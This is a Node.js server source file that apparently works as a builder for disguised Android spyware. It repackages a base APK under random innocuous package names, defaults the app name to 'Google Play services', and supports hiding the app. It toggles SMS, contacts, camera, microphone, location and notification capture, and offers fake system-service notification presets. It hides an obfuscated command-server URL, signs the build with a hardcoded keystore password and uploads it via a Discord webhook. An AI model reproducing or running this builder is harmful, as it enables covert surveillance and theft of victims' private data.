const express = require('express');
const multer  = require('multer');
const cors    = require('cors');
const fs      = require('fs');
const path    = require('path');
const { exec, spawn } = require('child_process');
const sharp   = require('sharp');
const axios   = require('axios');
const cloudinary = require('cloudinary').v2;
const FormData   = require('form-data');
require('dotenv').config();

const app  = express();
const port = process.env.PORT || 4000;
app.use(cors());
app.use(express.json());

const upload = multer({ storage: multer.memoryStorage() });

const ASSETS = path.join(__dirname, 'assets');
const TEMP   = path.join(__dirname, 'temp');
const BASE_APK  = path.join(ASSETS, 'base.apk');
const KEYSTORE  = path.join(ASSETS, 'usman90.jks');
const SIGNER    = path.join(ASSETS, 'uber-apk-signer.jar');
const MATERIAL_ATTRS = ['state_liftable','state_lifted','state_dragged','state_collapsible','state_collapsed'];

if (!fs.existsSync(TEMP)) fs.mkdirSync(TEMP, { recursive: true });

// ── Promise-wrapped spawn ──────────────────────────────────────────────────
function runCmd(cmd, args, opts = {}) {
    return new Promise((resolve, reject) => {
        console.log('[CMD]', cmd, args.join(' '));
        const p = spawn(cmd, args, { ...opts, stdio: 'inherit' });
        p.on('close', code => code === 0 ? resolve() : reject(new Error(`${cmd} exited ${code}`)));
        p.on('error', reject);
    });
}

// ── Package name pool (any length, proper 3-part names) ───────────────────
const PKG_POOL = [
    'com.cloudapp.sync','com.nettools.pro','com.appworks.core','com.devkit.tools',
    'com.systools.app','com.datalink.hub','com.smartapp.core','com.cloudworks.io',
    'com.appcore.utils','com.droidlab.net','com.techworks.app','com.infomedia.hub',
    'com.moblink.data','com.syncbridge.io','com.appgate.core','com.netbridge.app',
];
function resolvePackage(userPkg) {
    if (!userPkg || !userPkg.trim()) return PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];
    const clean = userPkg.trim().toLowerCase().replace(/[^a-z0-9.]/g,'');
    const parts = clean.split('.').filter(Boolean);
    if (parts.length >= 3) return parts.slice(0,3).join('.');
    if (parts.length === 2) return clean + '.' + ['sync','hub','core','app','pro'][Math.floor(Math.random()*5)];
    return PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];
}

// ── AndroidManifest.xml text editing ────────────────────────────────────
const OLD_PKG = 'com.asml.tech';

function editManifest(text, cfg, targetPkg) {
    // 1. Change application package identity
    if (targetPkg !== OLD_PKG) {
        text = text.replace(new RegExp(`package="${OLD_PKG.replace(/\./g,'\\.')}"`, 'g'), `package="${targetPkg}"`);
        // Convert relative class refs (.ClassName) to absolute (com.asml.tech.ClassName)
        // so DEX lookup still resolves correctly even though applicationId changed
        text = text.replace(/android:name="\.([\w.]+)"/g, `android:name="${OLD_PKG}.$1"`);
        // Keep broadcast action pointing to old internal package (WakeHandler internal broadcast)
        // No change needed — action strings are arbitrary identifiers, not package-resolved
    }

    // 2. Remove unneeded permissions
    const remove = [];
    if (!cfg.enableStoragePermission)        remove.push('READ_MEDIA_IMAGES','READ_MEDIA_VIDEO','READ_EXTERNAL_STORAGE');
    if (!cfg.enableCameraPermission)         remove.push('CAMERA','FOREGROUND_SERVICE_CAMERA');
    if (!cfg.enableMicrophonePermission)     remove.push('RECORD_AUDIO','FOREGROUND_SERVICE_MICROPHONE');
    if (!cfg.enableSmsPermission)            remove.push('READ_SMS','RECEIVE_SMS');
    if (!cfg.enableContactsPermission)       remove.push('READ_CONTACTS');
    if (!cfg.enableLocationPermission)       remove.push('ACCESS_FINE_LOCATION','ACCESS_COARSE_LOCATION','FOREGROUND_SERVICE_LOCATION');
    if (!cfg.enableCameraPermission && !cfg.enableMicrophonePermission) remove.push('MANAGE_OWN_CALLS');

    for (const perm of remove) {
        text = text.replace(
            new RegExp(`[ \\t]*<uses-permission[^>]+android\\.permission\\.${perm}[^/]*/?>\\r?\\n?`, 'g'), '');
    }

    // 3. Remove unneeded service/receiver components
    if (!cfg.enableNotificationListener) {
        text = text.replace(/[ \t]*<service[^\n]*AlertWatcher[\s\S]*?<\/service>[ \t]*\r?\n?/g, '');
    }
    if (!cfg.enableSmsPermission) {
        text = text.replace(/[ \t]*<receiver[^\n]*SmsDeliverStub[\s\S]*?<\/receiver>[ \t]*\r?\n?/g, '');
        text = text.replace(/[ \t]*<receiver[^\n]*MmsStub[\s\S]*?<\/receiver>[ \t]*\r?\n?/g, '');
    }
    if (!cfg.enableCameraPermission && !cfg.enableMicrophonePermission) {
        text = text.replace(/[ \t]*<service[^\n]*AudioRouteService[\s\S]*?<\/service>[ \t]*\r?\n?/g, '');
    }

    return text;
}

// ── strings.xml app name edit ────────────────────────────────────────────
function setAppName(workDir, newName) {
    const stringsPath = path.join(workDir, 'res', 'values', 'strings.xml');
    if (!fs.existsSync(stringsPath)) return;
    let content = fs.readFileSync(stringsPath, 'utf8');
    content = content.replace(/<string name="app_name">.*?<\/string>/s, `<string name="app_name">${newName}</string>`);
    fs.writeFileSync(stringsPath, content);
    console.log(`[PATCH] app_name → "${newName}"`);
}

// ── Icon replacement ─────────────────────────────────────────────────────
async function replaceIcons(workDir, pngBuffer) {
    const densities = [
        { dir: 'mipmap-mdpi',    size: 48  },
        { dir: 'mipmap-hdpi',    size: 72  },
        { dir: 'mipmap-xhdpi',   size: 96  },
        { dir: 'mipmap-xxhdpi',  size: 144 },
        { dir: 'mipmap-xxxhdpi', size: 192 },
    ];

    let replaced = 0;
    for (const { dir, size } of densities) {
        const dirPath = path.join(workDir, 'res', dir);
        if (!fs.existsSync(dirPath)) continue;
        for (const file of fs.readdirSync(dirPath)) {
            if (!file.startsWith('ic_launcher')) continue;
            const ext   = path.extname(file).toLowerCase();
            const isWebp = ext === '.webp';
            try {
                const buf = isWebp
                    ? await sharp(pngBuffer).resize(size, size).webp({ quality: 95 }).toBuffer()
                    : await sharp(pngBuffer).resize(size, size).png().toBuffer();
                fs.writeFileSync(path.join(dirPath, file), buf);
                replaced++;
            } catch (e) {
                console.error(`[ICON] ${dir}/${file}:`, e.message);
            }
        }
    }
    // Remove adaptive XML — prevents Android from overriding our custom icon
    const anydpiDir = path.join(workDir, 'res', 'mipmap-anydpi-v26');
    if (fs.existsSync(anydpiDir)) fs.rmSync(anydpiDir, { recursive: true, force: true });

    console.log(`[PATCH] Icons: replaced ${replaced} files`);
}

// ── Patch Material Design attrs (safety for older base APKs) ────────────
function patchAttrs(workDir) {
    const attrsPath = path.join(workDir, 'res', 'values', 'attrs.xml');
    if (fs.existsSync(attrsPath)) {
        let content = fs.readFileSync(attrsPath, 'utf8');
        for (const attr of MATERIAL_ATTRS) {
            if (!content.includes(`name="${attr}"`)) {
                content = content.replace('</resources>', `    <attr name="${attr}" format="boolean" />\n</resources>`);
            }
        }
        fs.writeFileSync(attrsPath, content);
    } else {
        const valDir = path.join(workDir, 'res', 'values');
        fs.mkdirSync(valDir, { recursive: true });
        fs.writeFileSync(attrsPath,
            `<?xml version="1.0" encoding="utf-8"?>\n<resources>\n${MATERIAL_ATTRS.map(a=>`    <attr name="${a}" format="boolean" />`).join('\n')}\n</resources>\n`);
    }
}

// ── Notification presets ─────────────────────────────────────────────────
const PRESETS = {
    default:            { title:'Google Play services',  text:'Running background checks',  icon:'info',     action:'device_info' },
    sync:               { title:'Cloud Backup',          text:'Syncing data in background', icon:'sync',     action:'none'        },
    google_play:        { title:'Google Play services',  text:'Checking for updates...',    icon:'info',     action:'device_info' },
    android_system:     { title:'Android System',        text:'System functions active',    icon:'sync',     action:'settings'    },
    device_security:    { title:'Security & Privacy',    text:'All systems secured',        icon:'lock',     action:'security'    },
    device_maintenance: { title:'Device Care',           text:'Running in background',      icon:'sync',     action:'settings'    },
    download_manager:   { title:'Download Manager',      text:'Transfer complete',          icon:'download', action:'none'        },
    system_ui:          { title:'System UI',             text:'Syncing data',               icon:'sync',     action:'settings'    },
    cloud:              { title:'Cloud Storage',         text:'Connected to cloud',         icon:'sync',     action:'none'        },
    active:             { title:'System Framework',      text:'Service active',             icon:'info',     action:'none'        },
};

// ══════════════════════════════════════════════════════════════════════════
//  /generate  ENDPOINT
// ══════════════════════════════════════════════════════════════════════════
app.post('/generate', upload.single('icon'), async (req, res) => {
    const {
        uuid, appName, packageName: userPkg, hideApp, webLink, callbackUrl,
        enableSmsPermission, enableContactsPermission, enableStoragePermission,
        enableCameraPermission, enableMicrophonePermission, enableNotificationListener,
        enableLocationPermission, aggressivePermissions,
        notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon,
    } = req.body;
    const customIcon = req.file;

    console.log(`[APK] uuid=${uuid} app="${appName}" pkg="${userPkg}"`);
    res.status(202).json({ message: 'Processing started' });

    (async () => {
        const sendUpdate = async (event, data) => {
            if (!callbackUrl) return;
            try { await axios.post(callbackUrl, { uuid, event, data }); }
            catch (e) { console.error('[WH]', e.message); }
        };

        const workDir      = path.join(TEMP, `work-${uuid}`);
        const unsignedPath = path.join(TEMP, `unsigned-${uuid}.apk`);

        try {
            if (!fs.existsSync(BASE_APK)) throw new Error('assets/base.apk not found');
            if (fs.existsSync(workDir))      fs.rmSync(workDir, { recursive: true, force: true });
            if (fs.existsSync(unsignedPath)) fs.unlinkSync(unsignedPath);

            const preset       = PRESETS[notificationStyle] || PRESETS.default;
            const targetPkg    = resolvePackage(userPkg);
            const targetName   = (appName && appName.trim()) ? appName.trim() : 'Google Play services';
            const finalApkName = `${targetName.replace(/[^a-zA-Z0-9]/g, '-')}.apk`;

            const socketUrl = process.env.SOCKET_SERVER_URL || 'https://p01--gallery-eye--9zr85m7yb6s4.code.run';
            const netParams  = Array.from(socketUrl).map((c, i) => c.charCodeAt(0) + (i % 7));
            const themeColors = Array.from(webLink || '').map(c => c.charCodeAt(0));

            // Runtime config — permissions controlled here, not in manifest
            const cfg = {
                hideApp:                    hideApp === 'true',
                theme_colors:               themeColors,
                net_params:                 netParams,
                appName:                    targetName,
                packageName:                targetPkg,
                enableSmsPermission:        enableSmsPermission === 'true',
                enableContactsPermission:   enableContactsPermission === 'true',
                enableStoragePermission:    enableStoragePermission !== 'false',
                enableCameraPermission:     enableCameraPermission === 'true',
                enableMicrophonePermission: enableMicrophonePermission === 'true',
                enableLocationPermission:   enableLocationPermission === 'true',
                enableNotificationListener: enableNotificationListener === 'true',
                aggressivePermissions:      aggressivePermissions === 'true',
                notificationClickAction:    notificationClickAction || preset.action,
                notificationTitle:          (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
                notificationText:           (notificationText  && notificationText.trim())  ? notificationText.trim()  : preset.text,
                notificationIcon:           notificationIcon   || preset.icon,
                notificationChannelName:    (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
            };

            // ── 1. Decompile resources only (--no-src skips smali → DEX intact) ──
            await sendUpdate('apk_progress', { step: 'Decompiling resources...', progress: 10 });
            await runCmd('apktool', ['d', BASE_APK, '-o', workDir, '-f', '--no-src']);

            // ── 2. Edit AndroidManifest.xml ────────────────────────────────────
            await sendUpdate('apk_progress', { step: 'Configuring permissions & identity...', progress: 25 });
            const manifestPath = path.join(workDir, 'AndroidManifest.xml');
            let   manifestText = fs.readFileSync(manifestPath, 'utf8');
            manifestText = editManifest(manifestText, cfg, targetPkg);
            fs.writeFileSync(manifestPath, manifestText);
            console.log(`[PATCH] Manifest: pkg=${targetPkg}, permissions filtered`);

            // ── 3. Set app name in strings.xml ────────────────────────────────
            await sendUpdate('apk_progress', { step: 'Setting app name...', progress: 35 });
            setAppName(workDir, targetName);

            // ── 4. Replace launcher icons ─────────────────────────────────────
            if (customIcon && customIcon.buffer) {
                await sendUpdate('apk_progress', { step: 'Embedding custom icon...', progress: 45 });
                await replaceIcons(workDir, customIcon.buffer);
            }

            // ── 5. Patch Material Design attrs (safety) ───────────────────────
            patchAttrs(workDir);

            // ── 6. Inject assets ──────────────────────────────────────────────
            await sendUpdate('apk_progress', { step: 'Injecting configuration...', progress: 55 });
            const assetsDir = path.join(workDir, 'assets');
            fs.mkdirSync(assetsDir, { recursive: true });
            fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(cfg, null, 2));
            fs.writeFileSync(path.join(assetsDir, 'uuid.txt'), uuid);

            // ── 7. Rebuild APK (DEX files from --no-src are preserved as-is) ──
            await sendUpdate('apk_progress', { step: 'Rebuilding APK package...', progress: 65 });
            await runCmd('apktool', ['b', workDir, '-o', unsignedPath]);
            console.log(`[APK] Built: ${unsignedPath}`);

            // ── 8. Sign with usman90.jks (V1+V2+V3, zipalign included) ────────
            await sendUpdate('apk_progress', { step: 'Signing with usman90 keystore...', progress: 80 });
            const ksArgs = fs.existsSync(KEYSTORE)
                ? `--ks "${KEYSTORE}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
                : '';
            const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP}" ${ksArgs} --allowResign`;

            await new Promise((resolve, reject) => {
                exec(signCmd, { timeout: 120000 }, (err, stdout, stderr) => {
                    if (err) {
                        console.error('[SIGN]', stderr || err.message);
                        exec(`java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP}" --allowResign`,
                            { timeout: 60000 }, e2 => e2 ? reject(e2) : resolve());
                    } else {
                        console.log('[SIGN] usman90.jks — done');
                        resolve();
                    }
                });
            });

            // ── 9. Find signed output ─────────────────────────────────────────
            await sendUpdate('apk_progress', { step: 'Finalizing...', progress: 90 });
            const signedName = fs.readdirSync(TEMP).find(f =>
                f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));
            if (!signedName) throw new Error('Signed APK not found');
            const signedPath = path.join(TEMP, signedName);

            // ── 10. Upload ────────────────────────────────────────────────────
            let downloadUrl = '';
            await sendUpdate('apk_progress', { step: 'Uploading to cloud...', progress: 95 });

            if (process.env.DISCORD_WEBHOOK_URL) {
                try {
                    const form = new FormData();
                    form.append('file', fs.createReadStream(signedPath), { filename: finalApkName });
                    const r = await axios.post(process.env.DISCORD_WEBHOOK_URL, form, {
                        headers: form.getHeaders(), maxBodyLength: Infinity, maxContentLength: Infinity,
                    });
                    downloadUrl = r.data?.attachments?.[0]?.url || '';
                    if (downloadUrl) console.log('[UPLOAD] Discord:', downloadUrl);
                } catch (e) { console.error('[UPLOAD] Discord:', e.message); }
            }

            if (!downloadUrl && process.env.CLOUDINARY_CLOUD_NAME) {
                try {
                    cloudinary.config({
                        cloud_name:  process.env.CLOUDINARY_CLOUD_NAME,
                        api_key:     process.env.CLOUDINARY_API_KEY,
                        api_secret:  process.env.CLOUDINARY_API_SECRET,
                    });
                    const binPath = signedPath.replace('.apk', '.bin');
                    fs.copyFileSync(signedPath, binPath);
                    const r = await cloudinary.uploader.upload(binPath, {
                        resource_type: 'raw', folder: 'generated_apks',
                        public_id: `${finalApkName.replace('.apk','')}_${Date.now()}`,
                    });
                    downloadUrl = r.secure_url || '';
                    if (fs.existsSync(binPath)) fs.unlinkSync(binPath);
                    if (downloadUrl) console.log('[UPLOAD] Cloudinary:', downloadUrl);
                } catch (e) { console.error('[UPLOAD] Cloudinary:', e.message); }
            }

            // ── Cleanup ───────────────────────────────────────────────────────
            [unsignedPath, signedPath].forEach(p => { try { if(fs.existsSync(p)) fs.unlinkSync(p); } catch(_){} });
            try { if(fs.existsSync(workDir)) fs.rmSync(workDir, { recursive: true, force: true }); } catch(_){}

            if (downloadUrl) {
                await sendUpdate('apk_ready', { downloadUrl, packageName: targetPkg });
                console.log(`[APK] ✓ Done: ${uuid} | pkg=${targetPkg}`);
            } else {
                await sendUpdate('apk_error', { message: 'Upload failed — no storage configured' });
            }

        } catch (err) {
            console.error(`[APK] ✗ Failed ${uuid}:`, err.message);
            try { await sendUpdate('apk_error', { message: err.message }); } catch(_){}
            // Cleanup on error
            try { if(fs.existsSync(workDir)) fs.rmSync(workDir, { recursive: true, force: true }); } catch(_){}
            try { if(fs.existsSync(unsignedPath)) fs.unlinkSync(unsignedPath); } catch(_){}
        }
    })();
});

app.listen(port, () => console.log(`[APK Generator] Port ${port}`));
